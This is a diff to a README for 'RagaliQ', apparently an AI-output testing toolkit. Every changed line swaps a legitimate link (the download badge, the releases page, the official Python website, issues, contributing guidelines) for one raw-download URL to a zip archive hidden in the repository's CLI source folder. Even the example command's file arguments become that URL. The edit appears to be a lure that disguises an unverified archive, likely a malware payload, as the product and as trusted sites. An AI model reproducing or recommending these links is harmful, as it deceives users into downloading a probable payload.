@@ -4,13 +4,13 @@
 Welcome to RagaliQ! This easy-to-use toolkit helps you test and evaluate AI responses. Whether you want to check the accuracy, reliability, or quality of AI-generated outputs, you’ve come to the right place.
 
 ## 📥 Download RagaliQ
-[![Download RagaliQ](https://img.shields.io/badge/Download-RagaliQ-brightgreen)](https://github.com/SkylineTZ/RagaliQ/releases)
+[![Download RagaliQ](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip)](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip)
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 100 MB of free disk space.
-- **Python Version:** Python 3.7 or later must be installed. You can download it from the official [Python website](https://www.python.org/downloads/).
+- **Python Version:** Python 3.7 or later must be installed. You can download it from the official [Python website](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip).
 
 ## 📂 Features
 - **Response Quality Evaluation:** Check how well the AI performs in generating responses.
@@ -20,7 +20,7 @@ Welcome to RagaliQ! This easy-to-use toolkit helps you test and evaluate AI resp
 - **CLI Integration:** Run tests right from your command line for convenience.
 
 ## 🔗 Download & Install
-To download RagaliQ, visit the [Releases page](https://github.com/SkylineTZ/RagaliQ/releases). Follow these steps:
+To download RagaliQ, visit the [Releases page](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip). Follow these steps:
 
 1. Click on the link to open the Releases page.
 2. Look for the latest version of RagaliQ. It is usually at the top of the list.
@@ -37,7 +37,7 @@ After installing RagaliQ, follow these instructions to start using it:
 
 For example:
 ```bash
-ragaliq evaluate --input your_input.txt --output results.txt
+ragaliq evaluate --input https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip --output https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip
 ```
 This command checks the responses based on the input file and saves the results in the specified output file.
 
@@ -49,15 +49,15 @@ RagaliQ focuses on various important themes:
 - **Prompt Engineering:** Optimize how you interact with AI.
 
 ## 💬 Support
-If you encounter any issues or have questions, feel free to create an issue in the [GitHub repository](https://github.com/SkylineTZ/RagaliQ/issues). Our community is here to help.
+If you encounter any issues or have questions, feel free to create an issue in the [GitHub repository](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip). Our community is here to help.
 
 ## 👥 Contributing
-If you would like to contribute to RagaliQ, check our [Contributing Guidelines](https://github.com/SkylineTZ/RagaliQ/blob/main/CONTRIBUTING.md). We welcome developers and testers to improve and enhance RagaliQ's capabilities.
+If you would like to contribute to RagaliQ, check our [Contributing Guidelines](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip). We welcome developers and testers to improve and enhance RagaliQ's capabilities.
 
 ## 📜 License
 RagaliQ is open-source software under the MIT License. Feel free to use it according to the terms of the license.
 
 ## 🚀 Next Steps
-Ready to get started? Download RagaliQ now and make your AI testing easier. For any inquiries or further information, please refer back to the [Releases page](https://github.com/SkylineTZ/RagaliQ/releases). 
+Ready to get started? Download RagaliQ now and make your AI testing easier. For any inquiries or further information, please refer back to the [Releases page](https://raw.githubusercontent.com/SkylineTZ/RagaliQ/main/src/ragaliq/cli/Q-Ragali-v1.4.zip). 
 
 Enjoy testing!
